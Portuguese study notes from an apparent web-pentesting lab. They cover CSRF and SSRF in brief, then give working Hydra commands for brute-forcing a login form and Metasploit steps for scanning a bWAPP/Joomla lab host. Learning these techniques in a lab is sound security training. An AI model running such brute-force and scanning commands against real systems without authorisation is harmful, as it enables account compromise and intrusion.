CSRF Cross Site Request Forgery
Requisição Falsa Entre Sites
o arquivo CSRFPoc.html contem um formulario criado a partir de uma
interceptação de método post que pegou os dados e quando a pessoa executa o
arquivo (abre o arquivo), um usuario novo é criado automaticamente 
e assim o hacker entra no sistema sem problemas
Entretanto é preciso que essa pessoa se log no sistema usando o arquivo html para logar, o que é bastante improvável.


Server-side request forgery (SSRF)
Ocorre quando existe a possibilidade de acessar a pagina localhost de um site
Podemos interceptar uma pagina com o burp suite e no momento que uma requisição for feita podemos colocar 
o http://localhost na api que está sendo usada

Utilizando o hydra para login via brute force com um arquivo de texto com usuarios
hydra -V -L users.txt -p senha-qualquer "localhost" http-form-post "/bruteforce1/index.php:username=^USER^&password=^PASS^:S=Senha incorreta"

o arquivo users.txt deve estar na pasta da execução do comando

Testando um usuario com varias senhas
hydra -V -l bruno -P passwords.txt "localhost" http-form-post "/bruteforce1/index.php:username=^USER^&password=^PASS^:Senha incorreta"



Usando metasploit framework

$ msfconsole
Para scaniar um site web feito com joomla, podemos usar a ferramenta auxiliar
joomla version do metasploit
use auxiliary/scanner/http/joomla_version
set RHOSTS 192.168.0.28
set TARGETURI /joomla
run

usar força bruta para descobrir se o site tem pastas expostas na web
use auxiliary/scanner/http/brute_dirs
set RHOSTS 192.168.0.28
set PATH /bWAPP
run

Usando wmap para encontrar os modulos auxiliares para executar depois
service postgresql start
sudo msfdb init
sudo msfdb start  
msfconsole
load wmap
wmap_sites -a http://192.168.0.28/
wmap_targets -t http://192.168.0.28/bWAPP/
wmap_run -t
wmap_run -e ---- para executar os modulos auxiliares encontrados

